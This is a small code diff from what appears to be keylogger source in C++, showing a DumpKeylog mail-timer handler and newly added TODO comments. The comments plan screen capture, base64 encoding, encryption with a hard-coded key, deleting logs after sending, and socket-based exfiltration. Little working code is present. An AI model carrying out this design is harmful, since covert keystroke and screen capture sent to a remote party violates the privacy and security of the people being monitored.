@@ -18,7 +18,10 @@ using namespace std;
 KeyboardManager keyboardManager;
 
 // TODO delete logs after running them
-// TODO reorganize Timer class
+// TODO grab screen buffer based on timer
+// TODO Encode screen buffer into base64
+// TODO encrypt mail with a hard coded public key
+// TODO Potentially change from email based delivery system to socket based one
 
 // MailTimer Handler function
 void DumpKeylog()
